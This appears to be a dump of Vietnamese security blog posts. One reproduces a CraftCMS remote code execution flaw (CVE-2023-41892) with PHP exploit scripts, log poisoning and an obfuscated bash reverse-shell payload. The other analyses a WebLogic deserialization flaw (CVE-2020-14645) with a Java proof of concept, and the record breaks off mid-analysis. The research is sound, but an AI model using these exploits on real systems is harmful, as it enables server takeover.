3 4 5 6 7 8 9 10 11 12 13 POST /my-craftcms/web/admin HTTP/1.1 Host: 192.168.159.149 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://192.168.159.148/my-craftcms/web/admin/plugin-store/feed-me Origin: http://192.168.159.148 DNT: 1 Content-Length: 83 Content-Type: application/x-www-form-urlencoded action=conditions%2Frender\u0026amp;config={\u0026#34;name\u0026#34;%3a\u0026#34;condition\u0026#34;}\u0026amp;condition=ConditionInterface Với request này, chương trình sẽ đi vào hàm vendor\\craftcms\\cms\\src\\services\\Conditions.php:createCondition()\nCơ bản thì chương trình sẽ lấy giá trị name param config, xem nó là 1 param trong request (ở đây là condition) và lấy giá trị của condition như một class để tạo object. Tuy nhiên, tại dòng 50, class này bắt buộc phải implement interface ConditionInterface)\nĐể giải quyết vấn đề nay, đầy tiên tôi dùng regex để search trên toàn bộ source code xem thử:\nChỉ có 1 abstract class BaseCondition. Tôi tiến hành search trên google để tìm document xem sao và đã tìm được kết quả tại https://docs.craftcms.com/api/v4/craft-base-conditions-conditioninterface.html##public-method. Đây là danh sách các class chúng ta có thể sử dụng\nTới request như sau, chúng ta có thể tiếp tục chương trình\n1 2 3 4 5 6 7 8 9 10 11 12 13 POST /my-craftcms/web/admin HTTP/1.1 Host: 192.168.159.149 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://192.168.159.148/my-craftcms/web/admin/plugin-store/feed-me Origin: http://192.168.159.148 DNT: 1 Content-Length: 85 Content-Type: application/x-www-form-urlencoded action=conditions%2Frender\u0026amp;config={\u0026#34;name\u0026#34;%3a\u0026#34;condition\u0026#34;}\u0026amp;condition=craft\\elements\\conditions\\ElementCondition Sau khi kiểm tra class truyền vào được implement ConditionInterface, hàm sẽ trả về một object được tạo thành từ class truyền vào\nDễ thấy, hàm createObject() còn có thêm hai trường attributes và conditionRules được lấy giá trị từ config và rules.\nCùng tiếp tục flow của chương trình:\nSau khi trả class về, hàm Craft:configure được thực thi:\nHàm Craft:configure nhận vào hai tham số $object và $properties tương ứng với $this-\u0026gt;_condition và $baseConfig (hai giá trị này chúng ta control được). Nhiệm vụ của hàm là gán các properties cho object.\nNhìn sơ qua thì rất bình thường đúng không? Lúc đầu tôi nghĩ lỗ hổng là ở đây vì chúng ta có thể gán bất kì giá trị nào cho bất kì properties nào của $object. Như thế, việc còn lại tìm gadget chain để khai thác thôi. Tuy nhiên, ta thấy $object ở đây có giới hạn: được tạo thành từ các class implement ConditionInterface.\nTôi nhớ rằng trong blog của anh thanhtc có nói lỗ hổng này cho phép tạo một object bất kì như tới đây tôi chỉ có thể tạo object môt cách giới hạn. Sau đó, tôi quyết định đọc kĩ lại blog một lần nữa (chắc đây là lần đọc lại thứ 5-6) và tôi đã chú ý tới cái hint mà anh để lại:\nBạn thấy chứ? Trong luồng thực thi trên, chúng ta đang ở \\yii\\BaseYii::configure\nĐặt breakpoint tại \\yii\\base\\Componet::__set, chúng ta sẽ thấy, tại dòng 558, phép gán $object-\u0026gt;$name = $value sẽ gọi tới method \\yii\\base\\Componet::__set.\nHãy cùng sửa đổi lại request của chúng ta một tí. Tôi viết mã exploit bằng PHP để tiện cho việc build payload (hơn dùng burpsuite)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 \u0026lt;?php function triggerCode($url, $postData, $proxy = \u0026#39;127.0.0.1:8080\u0026#39;) { // Initialize cURL session $ch = curl_init($url); $options = [ CURLOPT_POST =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; http_build_query($postData), // Encode the POST data CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; $proxy, // Specify the proxy address and port ]; curl_setopt_array($ch, $options); // Execute the cURL session and store the response $response = curl_exec($ch); // Check for cURL errors if (curl_errno($ch)) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response from the server echo \u0026#39;Response: \u0026#39; . $response; } // Close the cURL session curl_close($ch); } // Usage for triggerCode $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $postData = [ \u0026#39;action\u0026#39; =\u0026gt; \u0026#39;conditions/render\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;name\u0026#34; =\u0026gt; \u0026#34;conditionClass\u0026#34;, \u0026#34;conditionClass\u0026#34; =\u0026gt; \u0026#34;xxxxx\u0026#34; ]), \u0026#39;conditionClass\u0026#39; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;craft\\elements\\conditions\\ElementCondition\u0026#39; ] ]; triggerCode($url, $postData); ?\u0026gt; Với request trên chúng ta sẽ vào được hàm \\yii\\base\\Componet::__set\nHai tham số truyền vào là $name và $value. Tuy theo giá trị $name truyền vào là gì thì chương trình sẽ xử lý khác nhau.\nHãy nhìn vào dòng lệnh 191. Nếu $name bắt đầu bằng 'as ' thì dòng 191 sẽ thực thi và câu lệnh Yii:createObject($value) sẽ được gọi. Ngoài ra, nhìn vào giá trị debug, bạn sẽ thấy hai giá trị $name và $value được chúng ta truyền vào Tới đây, chúng ta đã có khả năng tạo một object bất kì mà chúng ta muốn bằng requets như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 \u0026lt;?php function triggerCode($url, $postData, $proxy = \u0026#39;127.0.0.1:8080\u0026#39;) { // Initialize cURL session $ch = curl_init($url); $options = [ CURLOPT_POST =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; http_build_query($postData), // Encode the POST data CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; $proxy, // Specify the proxy address and port ]; curl_setopt_array($ch, $options); // Execute the cURL session and store the response $response = curl_exec($ch); // Check for cURL errors if (curl_errno($ch)) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response from the server echo \u0026#39;Response: \u0026#39; . $response; } // Close the cURL session curl_close($ch); } // Usage for triggerCode $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $postData = [ \u0026#39;action\u0026#39; =\u0026gt; \u0026#39;conditions/render\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;name\u0026#34; =\u0026gt; \u0026#34;conditionClass\u0026#34;, \u0026#34;as Class\u0026#34; =\u0026gt; \u0026#34;xxxxx\u0026#34; ]), \u0026#39;conditionClass\u0026#39; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;craft\\elements\\conditions\\ElementCondition\u0026#39; ] ]; triggerCode($url, $postData); ?\u0026gt; với xxxxx là địa chỉ class mà bạn muốn tạo\nVậy là chúng ta đã tìm được con đường từ source tới sink rồi. Phần còn lại là đi tìm gadget chain thôi\n3.3 From Chain read/execute file to RCE 3.3.1 read/execute file with \\yii\\rbac\\PHPManager Chain này nằm ở class \\yii\\rbac\\PhpManager. Có thể tại đây nhiều bạn thắc mắc tại sao có thể tìm ra class này. Tôi chỉ đơn giản là search thôi, search các làm liên quan tới read file, load file, execute rồi trace ngược xem nó được gọi từ class nào. Ngoài ra trong blog trước đây của tôi cũng có đề cập tới công cụ PHPGCC, bạn có thể sử dụng thử Để hiểu rõ hơn về chain này, chúng ta cùng đi thẳng vào mã khai thác luôn: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026lt;?php function triggerCode($url, $postData, $proxy = \u0026#39;127.0.0.1:8080\u0026#39;) { // Initialize cURL session $ch = curl_init($url); $options = [ CURLOPT_POST =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; http_build_query($postData), // Encode the POST data CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; $proxy, // Specify the proxy address and port ]; curl_setopt_array($ch, $options); // Execute the cURL session and store the response $response = curl_exec($ch); // Check for cURL errors if (curl_errno($ch)) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response from the server echo \u0026#39;Response: \u0026#39; . $response; } // Close the cURL session curl_close($ch); } // Usage for triggerCode $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $postData = [ \u0026#39;action\u0026#39; =\u0026gt; \u0026#39;conditions/render\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;name\u0026#34; =\u0026gt; \u0026#34;conditionClass\u0026#34;, \u0026#34;as Class\u0026#34; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#34;\\yii\\\\rbac\\PhpManager\u0026#34;, \u0026#34;itemFile\u0026#34; =\u0026gt; \u0026#34;@storage/logs/web-2023-09-29.log\u0026#34; ] ]), \u0026#39;conditionClass\u0026#39; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;craft\\elements\\conditions\\ElementCondition\u0026#39; ] ]; triggerCode($url, $postData); ?\u0026gt; Trong phần trước, chúng ta có thể truyền giá trị bất kì vào hàm Yii:createObject($value). Hàm Yii:createObject() cũng cho phép chúng tra truyền nhiều kiểu dữ liệu (string, array,callable)\nVới flow khai thác trước đó, chúng ta luôn gọi Yii:createObject($value) có nghĩa là $params luôn bằng null. May mắn thay, khi truyền vào $value dưới dạng array, chúng ta có thể thay đổi, thiết lập giá trị các properties của object (cớ chế giống như gọi hàm Craft:configure). Cụ thể, tôi có request như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026lt;?php function triggerCode($url, $postData, $proxy = \u0026#39;127.0.0.1:8080\u0026#39;) { // Initialize cURL session $ch = curl_init($url); $options = [ CURLOPT_POST =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; http_build_query($postData), // Encode the POST data CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; $proxy, // Specify the proxy address and port ]; curl_setopt_array($ch, $options); // Execute the cURL session and store the response $response = curl_exec($ch); // Check for cURL errors if (curl_errno($ch)) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response from the server echo \u0026#39;Response: \u0026#39; . $response; } // Close the cURL session curl_close($ch); } // Usage for triggerCode $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $postData = [ \u0026#39;action\u0026#39; =\u0026gt; \u0026#39;conditions/render\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;name\u0026#34; =\u0026gt; \u0026#34;conditionClass\u0026#34;, \u0026#34;as Class\u0026#34; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#34;\\yii\\\\rbac\\PhpManager\u0026#34;, \u0026#34;itemFile\u0026#34; =\u0026gt; \u0026#34;file_name\u0026#34; ] ]), \u0026#39;conditionClass\u0026#39; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;craft\\elements\\conditions\\ElementCondition\u0026#39; ] ]; triggerCode($url, $postData); ?\u0026gt; Với request trên, chương trình sẽ gọi hàm Yii:createObject($value) với $value là một array có 2 tham số như hình:\nCác bước tiếp theo debug để hiểu rõ flow của hàm createObject(), tôi sẽ lượt bớt phần này để nảy thẳng tới class \\yii\\rbac\\PhpManager (Bước này khá quan trọng cho những ai muốn tự build, custom payload)\nTiếp tục chương trình, vì được khởi tạo nên hàm __construct() của \\yii\\rbac\\PhpManager\nCách khai thác này giống với cách khai thác PHP deserialize, tìm các magic method để control value các properties để thay đổi luồng thực thi\nHàm này sẽ gọi Yii:configure()\nHàm này tương tự với Craft:configure() sẽ thiết lập giá trị các properties cho object\nTiếp theo, hàm $this-\u0026gt;init() được gọi. Tại bước này, object của chúng ta đã có property itemFile=\u0026quot;file_name\u0026quot;\nVào hàm init():\nCác giá trị sẽ được kiểm tra xem có phải là alias không, nếu phải thì sẽ lấy địa chỉ từ alias đó (trong CraftCMS, các alias được dùng để thay cho các địa chỉ cố định như là: @web, @storage,...\nSau đó hàm this-\u0026gt;load() được gọi, hàm này sẽ đọc nội dung từ địa chỉ file được truyền vào\nĐến đây thì chắc hẳn bạn đã hiểu trong mã khai thác, tại sao tôi biết và truyền property itemFile vào rồi đúng không? Là debug thấy đó.\nNhư vậy, tới đây, tôi đã có thể đọc được một file bất kì trên hệ thống nếu biết địa chỉ của nó. Tôi thử tạo một file Edisc.php với nội dung là\n1 2 3 \u0026lt;?php print_r(phpinfo()); ?\u0026gt; Cùng xem thử chain này chỉ đơn giản là đọc lên thôi hay thực thi code nữa.\nWow! Thật bất ngờ, nó thực thi code nữa. Thừa thắng xong lên kiếm RCE thôi!!! 😊😊😊😊\n3.3.2 RCE with log file Sau khi tìm được chain read/execute file bất kì, câu hỏi tiếp theo đặc ra là: nên read file nào? Tôi bắt đầu chú ý tới folder /opt/lampp/htdocs/my-craftcms/storage/logs : Nơi đây log lại các request tới server\nTên gọi theo format dễ đoán:\nTrong đó web-yyy-mm-dd.log lưu lại các request truyền tới, kể cả đó là authen hay unauthen\nĐịa chỉ này có alias là @storage\nNhư vậy, với địa chỉ file là @storage/logs/web-2023-09-29.log, tôi có thể đọc được log file. Tuy nhiên, câu chuyện là làm sao để có thể RCE. Thứ nhất log file có định dạng là file.log, liệu có thực thi được code không? Tôi thử ngay, viết vào file log đoạn code \u0026lt;?php print_r(phpinfo());?\u0026gt; rồi xem kết quả. Và kết quả không thể làm cho chúng ta mừng hơn ^^ Thực thi được. Bước tiếp theo, tôi cùng xem xét format của log để xem thử mình có thể break và chèn code vào được hay không. Tôi xóa hết log đi và thử requets đơn giản trước: 1 2 3 4 5 6 7 8 POST /my-craftcms/web/admin HTTP/1.1 Host: 192.168.159.149 Accept: */* Content-Length: 511 Content-Type: application/x-www-form-urlencoded Connection: close xxxx=xxx Sau một hồi thử, tôi phát hiện chúng ta có thể break bằng request như sau: xxxx=']\u0026lt;?php print_r(phpinfo())?\u0026gt;'[ Thử đọc lại file xem sao: Ngon lành, thừa thắng xông lên thôi!!!\nSearch ngay trên mạng 1 payload revershell rồi thực thi ngay thôi. Như vậy là xong…\nNhưng đời không như mơ đâu… Vì khi ghi log, thì dấu ' và \u0026quot; sẽ bị lưu thành \\' và \\\u0026quot; nên mã khai thác của chúng ta không chạy. Chúng ta cần brainstorm làm sao để build 1 cái mã mà không có 2 dấu trên Và đây là POC cuối cùng của tôi.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 \u0026lt;?php function sendRequest($url, $cookie, $data) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_COOKIE, $cookie); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // This is equivalent to -k option in cURL curl_setopt($ch, CURLOPT_HTTPHEADER, [ \u0026#39;Host: 192.168.159.149\u0026#39;, \u0026#39;Accept: */*\u0026#39;, \u0026#39;Upgrade-Insecure-Requests: 1\u0026#39;, \u0026#39;Connection: close\u0026#39;, \u0026#39;Content-Length: \u0026#39; . strlen($data), ]); $response = curl_exec($ch); if ($response === false) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response including headers echo $response; } curl_close($ch); } // Usage $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $cookie = \u0026#39;command=xxx\u0026#39;; $data = \u0026lt;\u0026lt;\u0026lt;PHP \u0026#39;]\u0026lt;?php ?\u0026gt; ;\u0026lt;?php ;php \\$array = [76, 50, 74, 112, 98, 105, 57, 105, 89, 88, 78, 111, 73, 67, 49, 106, 73, 67, 99, 118, 89, 109, 108, 117, 76, 50, 74, 104, 99, 50, 103, 103, 76, 87, 107, 103, 80, 105, 89, 103, 76, 50, 82, 108, 100, 105, 57, 48, 89, 51, 65, 118, 77, 84, 107, 121, 76, 106, 69, 50, 79, 67, 52, 52, 77, 67, 52, 120, 76, 122, 107, 119, 77, 68, 69, 103, 77, 68, 52, 109, 77, 83, 99, 61]; \u0026lt;?php \\$array = [76, 50, 74, 112, 98, 105, 57, 105, 89, 88, 78, 111, 73, 67, 49, 106, 73, 67, 99, 118, 89, 109, 108, 117, 76, 50, 74, 104, 99, 50, 103, 103, 76, 87, 107, 103, 80, 105, 89, 103, 76, 50, 82, 108, 100, 105, 57, 48, 89, 51, 65, 118, 77, 84, 107, 121, 76, 106, 69, 50, 79, 67, 52, 52, 77, 67, 52, 120, 76, 122, 107, 119, 77, 68, 69, 103, 77, 68, 52, 109, 77, 83, 99, 61]; \\$string = array_reduce(\\$array, function (\\$a, \\$b) { return \\$a . chr(\\$b); }); print_r(base64_decode(\\$string)); exec(base64_decode(\\$string)); ?\u0026gt;\u0026#39; PHP; sendRequest($url, $cookie, $data); function triggerCode($url, $postData, $proxy = \u0026#39;127.0.0.1:8080\u0026#39;) { // Initialize cURL session $ch = curl_init($url); $options = [ CURLOPT_POST =\u0026gt; true, CURLOPT_POSTFIELDS =\u0026gt; http_build_query($postData), // Encode the POST data CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_PROXY =\u0026gt; $proxy, // Specify the proxy address and port ]; curl_setopt_array($ch, $options); // Execute the cURL session and store the response $response = curl_exec($ch); // Check for cURL errors if (curl_errno($ch)) { echo \u0026#39;cURL error: \u0026#39; . curl_error($ch); } else { // Output the response from the server echo \u0026#39;Response: \u0026#39; . $response; } // Close the cURL session curl_close($ch); } // Usage for triggerCode $url = \u0026#39;http://192.168.159.149/my-craftcms/web/admin\u0026#39;; $postData = [ \u0026#39;action\u0026#39; =\u0026gt; \u0026#39;conditions/render\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;name\u0026#34; =\u0026gt; \u0026#34;elementType\u0026#34;, \u0026#34;elementType\u0026#34; =\u0026gt; \u0026#34;\\yii\\\\rbac\\PhpManager\u0026#34;, \u0026#34;as class1\u0026#34; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#34;\\yii\\\\rbac\\PhpManager\u0026#34;, \u0026#34;itemFile\u0026#34; =\u0026gt; \u0026#34;@storage/logs/web-2023-09-29.log\u0026#34; ] ]), \u0026#39;elementType\u0026#39; =\u0026gt; [ \u0026#39;class\u0026#39; =\u0026gt; \u0026#39;craft\\elements\\conditions\\ElementCondition\u0026#39;, \u0026#39;config\u0026#39; =\u0026gt; json_encode([ \u0026#34;elementTypess\u0026#34; =\u0026gt; \u0026#34;\\yii\\\\rbac\\PhpManager\u0026#34;, \u0026#39;conditionRules\u0026#39; =\u0026gt; [\u0026#39;UploaderConditionRule\u0026#39;] ]) ] ]; // Sleep for 2 seconds sleep(2); triggerCode($url, $postData); ?\u0026gt; Một số lưu ý: Nếu các bạn bỏ qua các bước trên mà lấy POC ở trên chạy ngay thì nó sẽ không work (và đây cũng ko phải là tinh thần của blog này) Với cách khai thác này sẽ có nhiều yếu tố bị phụ thuộc: Tên địa chỉ file log có thể bị format lại ở realcase, chúng ta không đoán được. Cấu trúc lưu log, nội dung lưu log Do đó, chúng ta cần tìm một phương pháp khác để khai thác hiệu quả hơn. Đẹp nhất là tìm một chain cho phép lưu file tùy ý để rồi chúng ta execute. Yeah, một trong những đáp án đẹp đó nằm ở bài research này https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/. Còn đáp án cụ thể như thế nào thì chờ ở blog sau hoặc tôi sẽ update sau nhé. Bây giờ tôi phải submit để kịp deadline blog của tháng này để khỏi bị mất 200k thôi.\nIV. Tài liệu tham khảo https://blog.calif.io/p/craftcms-rce\nhttps://www.youtube.com/watch?v=j1MrBKIO0FQ\nhttps://craftcms.com/docs/4.x/installation.html\nhttps://www.cloudways.com/blog/php-debug/\nhttps://viblo.asia/p/yii-framework-tim-hieu-cau-truc-va-chay-thu-voi-basic-application-Qbq5QJOJKD8\n","description":"Sau vài tháng đắm chìm vào Java Deserialize attack và ôn luyện blackbox, tôi tí nữa là bị chết chìm luôn 😟. Đợt này nhân tiện có CVE mới của product CraftCMS viết bằng PHP, tôi quyết định reproduce để ôn lại PHP và lấy lại mood.","id":1,"section":"posts","tags":["cve, php"],"title":"Reproducing CVE-2023-41892: CraftCMS RCE","uri":"https://minhlongmt183.github.io/posts/cve-2023-41892_craftcms_rce/"},{"content":"I. Lời mở đầu Tiếp tục với series tự học Java Deserializee của newbie, trong bài này tôi trình bày về CVE-2020-14645 của weblogic.\nGiới thiệu sơ về đối tượng phân tích, CVE-2020-14645 là bypass của bản vá lỗi CVE-2020-2883. Trong bản patch lỗi CVE-2020-2883 sink MvelExtractor và ReflectionExtractor bị blacklisted, do đó cần tìm một extract class khác có malicious operations trong method.\nVì các patch lỗi CVE-2020-2883 là đưa hàm sink bị lỗi vào blacklist, nên chúng ta chỉ cần tìm ra 1 sink khác và sử dụng chain trước của CVE-2020-2883 để khai thác.\nTừ đây, ta rút ra một nhận xét:\nCách mà weblogic fix các CVE là đưa các hàm sink vào blacklist.\nVậy, để tìm ra 1 CVE mới chỉ “đơn giản” là tìm cách bypass các hàm đã có hoặc tìm ra chain mới. Nhưng câu chuyện đó vẫn còn xa với tôi 🤭🤭🤭🤭🤭🤭\nQuay lại với CVE này, ta sẽ xuất phát từ CVE-2020-14645. Cùng nhau phân tích, mổ xẻ để làm suy luận ra cách mà tác giả tìm thấy và hiểu tường tận lỗ hổng này. (Tất nhiên vì CVE này là bản bypass, nên chúng ta cần phải “tìm về cội nguồn” để hiểu rõ tường tận).\nII. CVE-2020-14645 2.1 Chuẩn bị môi trường Yeah, ban đầu, tạm chấp nhận chúng ta có mã khai thác POC. Bây giờ cùng phân tích mổ xẻ nó nào. Với Weblogic, chúng ta cần phải hiểu thêm về giao thức T3, RMI,… là những giao thức hỗ trợ về serialize và deserialize.\nVề bản chất thì payload serialize sẽ truyền lên webserver, thông qua giao thức trên để deserialize ra. Vì lí do kiến thức chưa đủ kiến thức về các protocol trên nên đoạn code mà tôi phân tích chỉ dùng readObject() để deserialize. Môi trường để tiến hành debug như sau:\njdk \u0026ldquo;1.8.0_121” WebLogic Server Version: 12.2.1.4.0 Mã khai thác phân tích:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 package CVE_2020_14645; import com.sun.rowset.JdbcRowSetImpl ; import com.tangosol.util.ValueExtractor ; import com.tangosol.util.comparator.ExtractorComparator ; import com.tangosol.util.extractor.ChainedExtractor ; import com.tangosol.util.extractor.UniversalExtractor ; import java.io.FileInputStream ; import java.io.FileOutputStream ; import java.io.ObjectInputStream ; import java.io.ObjectOutputStream ; import java.lang.reflect.Field ; import java.sql.SQLException ; import java.util.PriorityQueue ; public class cve_2020_14645 { public static void main(String[] args) throws Exception { // CVE_2020_14645 UniversalExtractor extractor = new UniversalExtractor(\u0026#34;getDatabaseMetaData()\u0026#34;, null, 1); final ExtractorComparator comparator = new ExtractorComparator(extractor); JdbcRowSetImpl rowSet = new JdbcRowSetImpl(); rowSet.setDataSourceName(\u0026#34;ldap://127.0.0.1:8082/glnikw\u0026#34;); final PriorityQueue \u0026lt; Object \u0026gt; queue = new PriorityQueue \u0026lt; Object \u0026gt; (2, comparator); Object[] q = new Object[] { rowSet, rowSet }; Field queue1 = queue.getClass().getDeclaredField(\u0026#34;queue\u0026#34;); queue1.setAccessible(true); queue1.set(queue, q); Field queue2 = queue.getClass().getDeclaredField(\u0026#34;size\u0026#34;); queue2.setAccessible(true); queue2.set(queue, 2); //serial ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;poc.ser\u0026#34;)); objectOutputStream.writeObject(queue); objectOutputStream.close(); //unserial ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\u0026#34;poc.ser\u0026#34;)); objectInputStream.readObject(); objectInputStream.close(); } } Lưu ý: Vì lỗ hổng tồn tại trong lib của Weblogic, nên ta cần phải import lib weblogic vào project. Trong trường hợp này, tôi export hết tất cả các lib trong weblogic ra vào import vào project.\nĐầu tiên, chúng ta có một đối tượng UniversalExtractor được khởi tạo với các tham số là \u0026quot;getDatabaseMetaData()\u0026quot;, null, và 1. Tiếp theo, chúng ta có một đối tượng ExtractorComparator được khởi tạo với đối tượng extractor. Sau đó, chúng ta tạo một đối tượng JdbcRowSetImpl, đặt dataSourceName là \u0026quot;ldap://127.0.0.1:8082/khch4r\u0026quot;. Tiếp theo, chúng ta tạo một hàng đợi ưu tiên (PriorityQueue) được gọi là queue với số lượng tối đa là 2 và một comparator để so sánh các phần tử trong hàng đợi. Sau đó, chúng ta khởi tạo một mảng đối tượng q chứa hai tham chiếu đến rowSet, và thiết lập lại các trường của queue thông qua reflection để đặt mảng q vào hàng đợi và đặt lại kích thước của hàng đợi là 2. Điều này giúp tạo ra một trạng thái không hợp lệ trong queue và sẽ gây ra lỗi khi tiến hành giải tuần tự hóa các phần tử trong hàng đợi sau đó. Tiếp theo, chúng ta tiến hành serialize queue bằng ObjectOutputStream và ghi dữ liệu vào file \u0026quot;poc.ser\u0026quot;. Cuối cùng, chúng ta tiến hành deserialize queue từ file \u0026quot;poc.ser\u0026quot; bằng ObjectInputStream và kì vọng payload sẽ được execute như hình 2.2 Debug Bắt đầu với hàm objectInputStream.readObject(); Trong blog trước, tôi có trình bày về flow của native readObject, trong đó, tôi có nhấn mạnh 2 method: ObjectInputStream##readOrdinaryObject và Method##invoke có tác dụng điều hướng luồng thực thi. Ở đây, ta sẽ thấy:\nTại ObjectInputStream##readOrdinaryObject: hàm readClassDesc() tại dòng 1781 sẽ trả về class của PriorityQueue, truyền vào hàm readSerialData() tại dòng 1808 Tại Method##invoke: cho thấy method private void java.util.PriorityQueue.readObject(java.io.ObjectInputStream) throws java.io.IOException,java.lang.ClassNotFoundException được gọi Sau đó, chương trình sẽ chuyển hướng về PriorityQueue##readObject Tới đây, chúng ta sẽ thấy flow liên quan tới blog trước như sau:\nMục tiêu của phần này chúng ta sẽ nghiên cứu tiếp flow từ PriorityQueue trở đi.\nTiếp tục flow, PriorityQueue##heapify được gọi. Method này đảm bảo tính chất của cấu trúc dữ liệu (min heap hoặc max heap). Điều này có nghĩa method này sẽ thực hiện phép so sánh ở đâu đó. Hãy nhìn vào vòng for: để gọi được siftDown() thì giá trị ban đầu của i (int i = (size \u0026gt;\u0026gt;\u0026gt; 1) -1) ≥ 0 (i = 0 thì siftDown() được gọi 1 lần). Tương đương với size ≥ 2 (vì size = 1 → i = -1). Do đó, chúng ta cần thiết lập PriorityQueue có ít nhất 2 phần tử để touch tới hàm này. Cách implement như sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 final PriorityQueue \u0026lt; Object \u0026gt; queue = new PriorityQueue \u0026lt; Object \u0026gt; (2, comparator); Object[] q = new Object[] { rowSet, rowSet }; Field queue1 = queue.getClass().getDeclaredField(\u0026#34;queue\u0026#34;); queue1.setAccessible(true); queue1.set(queue, q); Field queue2 = queue.getClass().getDeclaredField(\u0026#34;size\u0026#34;); queue2.setAccessible(true); queue2.set(queue, 2); Tiếp tục đi vào hàm PriorityQueue##siftDown Có hai option ở đây khi comparator null và khác null. Theo như tôi nghiên cứu, thì đa số các exploit để dùng comparator khác null. Với CommonCollection2,4 thì dùng TransformingComparator còn trong CVE này thì dùng ExtractorComparator. Để set giá trị comparator thành ExtractorComparator như sau:\n1 2 UniversalExtractor extractor = new UniversalExtractor(\u0026#34;getDatabaseMetaData()\u0026#34;, null, 1); final ExtractorComparator comparator = new ExtractorComparator(extractor); Khi extractor là ExtractorComparator, tại hàm siftDownUsingComparator() thì ExtractorComparator##compare được gọi\nTới đây, hàm ExtractorComparator##compare được gọi Tại đây, dòng 36 là toán tử 3 ngôi. Vì o1 có kiểu là JdbcRowSetImpl nên câu lệnh (Comparable)this.m_extractor.extract(o1) được thực thi. Mặt khác, this.m_extractor có kiểu là UniversalExtractor nên UniversalExtractor.extract() được gọi. Tiếp tục flow, đi vào hàm UniversalExtractor.extractComplex tại dòng 75. Hàm extractComplex sẽ gọi method method.invoke(oTarget, aoParam); tại dòng 205 với target là JdbcRowSetImpl và method là public java.sql.DatabaseMetaData com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData() throws java.sql.SQLException Tiếp tục, chương trình sẽ đi vào com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData() Hàm getDatabaseMetaData() sẽ gọi phương thức 